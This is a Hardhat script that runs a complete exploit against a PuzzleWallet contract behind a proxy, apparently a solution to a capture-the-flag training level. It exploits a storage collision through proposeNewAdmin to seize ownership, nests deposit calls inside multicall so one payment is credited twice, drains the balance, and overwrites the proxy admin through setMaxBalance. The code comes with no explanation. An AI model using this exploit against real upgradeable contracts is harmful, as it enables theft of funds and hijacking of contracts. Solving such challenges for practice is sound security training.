import { ethers } from "hardhat";

const CONTRACT_ADDRESS = "0x26730045324450065609d8424fbe186d30c82f57";
const CONTRACT_NAME = "PuzzleWallet";

async function main() {
  const [attacker] = await ethers.getSigners();

  const proxyFactory = await ethers.getContractFactory("PuzzleProxy");
  const proxyContract = proxyFactory.attach("0x17D5868E903D81F532dEA5652927FaB48d9278e0");

  const factory = await ethers.getContractFactory(CONTRACT_NAME);
  let puzzleWallet = factory.attach(CONTRACT_ADDRESS);

  let tx;
  tx = await proxyContract.proposeNewAdmin(attacker.address);
  await tx.wait();

  puzzleWallet = puzzleWallet.attach(proxyContract.address);

  tx = await puzzleWallet.addToWhitelist(attacker.address);
  await tx.wait();

  const data1 = puzzleWallet.interface.encodeFunctionData("deposit");
  const data2 = puzzleWallet.interface.encodeFunctionData("multicall", [[data1]]);

  tx = await await puzzleWallet.multicall([data1, data2], {
    value: ethers.utils.parseEther("0.001"),
  });
  await tx.wait();

  tx = await puzzleWallet.execute(attacker.address, ethers.utils.parseEther("0.002"), "0x");
  await tx.wait();

  tx = await puzzleWallet.setMaxBalance(attacker.address);
  await tx.wait();
}

main().catch(error => {
  console.error(error);
  process.exit(1);
});
